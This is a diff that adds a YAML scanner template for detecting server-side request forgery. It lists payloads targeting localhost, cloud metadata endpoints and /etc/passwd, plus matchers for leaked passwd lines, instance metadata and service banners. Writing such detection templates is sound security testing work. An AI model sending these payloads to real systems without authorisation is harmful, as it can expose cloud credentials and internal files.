@@ -1,0 +1,52 @@
+id: ssrf-basic
+name: Server-Side Request Forgery (SSRF)
+severity: high
+vulnerability_type: ssrf
+owasp: "A10:2021 Server-Side Request Forgery"
+cwe: CWE-918
+description: Detects SSRF via internal IP / cloud metadata access
+tags: [ssrf, owasp-top10]
+
+payloads:
+  - "http://127.0.0.1"
+  - "http://localhost"
+  - "http://0.0.0.0"
+  - "http://[::1]"
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://100.100.100.200/latest/meta-data/"
+  - "http://127.0.0.1:22"
+  - "http://127.0.0.1:3306"
+  - "file:///etc/passwd"
+
+request:
+  method: GET
+  inject_in: query
+
+matchers:
+  - type: word
+    value: "root:x:0:0"
+    part: body
+  - type: word
+    value: "ami-id"
+    part: body
+  - type: word
+    value: "instance-id"
+    part: body
+  - type: word
+    value: "computeMetadata"
+    part: body
+  - type: regex
+    value: "169\\.254\\.169\\.254"
+    part: body
+  - type: regex
+    value: "\\b(?:127\\.0\\.0\\.1|localhost)\\b"
+    part: body
+  - type: word
+    value: "OpenSSH"
+    part: body
+  - type: regex
+    value: "MySQL|MariaDB|postgres"
+    part: body
+
+match_condition: or
